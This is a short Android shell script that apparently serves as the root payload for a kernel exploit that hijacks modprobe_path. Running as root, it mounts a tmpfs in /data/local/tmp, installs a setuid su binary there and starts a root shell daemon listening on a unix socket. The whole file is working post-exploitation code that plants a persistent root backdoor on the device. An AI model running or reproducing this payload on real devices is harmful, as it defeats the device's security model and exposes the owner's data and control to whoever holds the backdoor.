#!/system/bin/sh
# Executed as root by call_usermodehelper (modprobe_path hijack).
# argv: placed by the kernel as "<modprobe_path> -q -- net-pf-30"
#
# 1) mount a fresh tmpfs for su ( /data is nosuid, so 4755 only works on tmpfs )
# 2) install the setuid su binary there
# 3) start the root shell daemon on a unix socket

D=/data/local/tmp
/system/bin/date > $D/.payload_ran 2>/dev/null

mkdir -p "$D/.su" 2>/dev/null

/system/bin/mount -t tmpfs -o mode=0755 tmpfs "$D/.su" 2>/dev/null
/system/bin/cp -f "$D/.su.bin" "$D/.su/su" 2>/dev/null
/system/bin/chmod 4755 "$D/.su/su" 2>/dev/null

"$D/rootshell" -d
